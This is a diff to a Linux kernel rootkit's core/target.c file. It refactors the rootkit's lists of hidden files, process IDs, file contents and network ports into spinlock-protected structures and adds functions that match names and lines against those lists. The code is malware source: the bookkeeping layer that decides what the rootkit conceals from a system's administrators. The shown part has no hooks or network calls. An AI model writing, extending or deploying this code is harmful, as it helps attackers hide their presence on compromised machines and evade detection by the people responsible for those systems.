@@ -1,85 +1,87 @@
 // SPDX-License-Identifier: GPL-2.0
+// core/target.c - Spinlocked target lists for hiding.
+#include <linux/string.h>
 #include "rootkit.h"
 
-/* String-keyed target arrays */
-char hidden_files[RK_MAX_TARGETS][RK_TARGET_LEN];
-int file_count;
+struct rk_target_list rk_file_targets;
+struct rk_target_list rk_pid_targets;
+struct rk_target_list rk_content_targets;
+struct rk_target_list rk_port_targets;
 
-char hidden_pids[RK_MAX_TARGETS][RK_TARGET_LEN];
-int pid_count;
-
-char hidden_contents[RK_MAX_TARGETS][RK_TARGET_LEN];
-int content_count;
-
-/* Port target array */
-unsigned short hidden_ports[RK_MAX_TARGETS];
-int port_count;
-
-int rk_target_add(char targets[][RK_TARGET_LEN], int *count,
-		  const char *value)
+void rk_target_init(struct rk_target_list *list)
 {
-	if (*count >= RK_MAX_TARGETS)
-		return -ENOSPC;
-	if (strlen(value) >= RK_TARGET_LEN)
-		return -ENAMETOOLONG;
-	strscpy(targets[*count], value, RK_TARGET_LEN);
-	(*count)++;
-	return 0;
+	spin_lock_init(&list->lock);
+	list->count = 0;
 }
 
-int rk_target_remove_at(char targets[][RK_TARGET_LEN], int *count, int idx)
+int rk_target_add(struct rk_target_list *list, const char *name)
 {
-	int j;
+	unsigned long flags;
+	int ret = 0;
 
-	if (idx < 0 || idx >= *count)
-		return -EINVAL;
-	for (j = idx; j < *count - 1; j++)
-		strscpy(targets[j], targets[j + 1], RK_TARGET_LEN);
-	(*count)--;
-	return 0;
-}
-
-int rk_target_remove(char targets[][RK_TARGET_LEN], int *count,
-		     const char *value)
-{
-	int i;
-
-	for (i = 0; i < *count; i++) {
-		if (strcmp(targets[i], value) == 0)
-			return rk_target_remove_at(targets, count, i);
+	spin_lock_irqsave(&list->lock, flags);
+	if (list->count >= RK_TARGET_MAX) {
+		ret = -ENOSPC;
+		goto out;
 	}
-	return -ENOENT;
+	strscpy(list->targets[list->count], name, RK_NAME_MAX);
+	list->count++;
+out:
+	spin_unlock_irqrestore(&list->lock, flags);
+	return ret;
 }
 
-int rk_port_add(unsigned short port)
+int rk_target_remove(struct rk_target_list *list, int idx)
 {
-	if (port_count >= RK_MAX_TARGETS)
-		return -ENOSPC;
-	hidden_ports[port_count] = port;
-	port_count++;
-	return 0;
+	unsigned long flags;
+	int ret = 0;
+
+	spin_lock_irqsave(&list->lock, flags);
+	if (idx < 0 || idx >= list->count) {
+		ret = -EINVAL;
+		goto out;
+	}
+	if (idx < list->count - 1) {
+		memmove(&list->targets[idx], &list->targets[idx + 1],
+			(list->count - idx - 1) * RK_NAME_MAX);
+	}
+	list->count--;
+out:
+	spin_unlock_irqrestore(&list->lock, flags);
+	return ret;
 }
 
-void rk_port_remove_at(int idx)
+bool rk_target_match(struct rk_target_list *list, const char *name)
 {
-	int j;
-
-	if (idx < 0 || idx >= port_count)
-		return;
-	for (j = idx; j < port_count - 1; j++)
-		hidden_ports[j] = hidden_ports[j + 1];
-	port_count--;
-}
-
-int rk_port_remove(unsigned short port)
-{
+	unsigned long flags;
+	bool found = false;
 	int i;
 
-	for (i = 0; i < port_count; i++) {
-		if (hidden_ports[i] == port) {
-			rk_port_remove_at(i);
-			return 0;
+	spin_lock_irqsave(&list->lock, flags);
+	for (i = 0; i < list->count; i++) {
+		if (strcmp(list->targets[i], name) == 0) {
+			found = true;
+			break;
 		}
 	}
-	return -ENOENT;
+	spin_unlock_irqrestore(&list->lock, flags);
+	return found;
+}
+
+bool rk_line_matches(struct rk_target_list *list,
+		     const char *line, int len)
+{
+	unsigned long flags;
+	bool found = false;
+	int i;
+
+	spin_lock_irqsave(&list->lock, flags);
+	for (i = 0; i < list->count; i++) {
+		if (strnstr(line, list->targets[i], len)) {
+			found = true;
+			break;
+		}
+	}
+	spin_unlock_irqrestore(&list->lock, flags);
+	return found;
 }
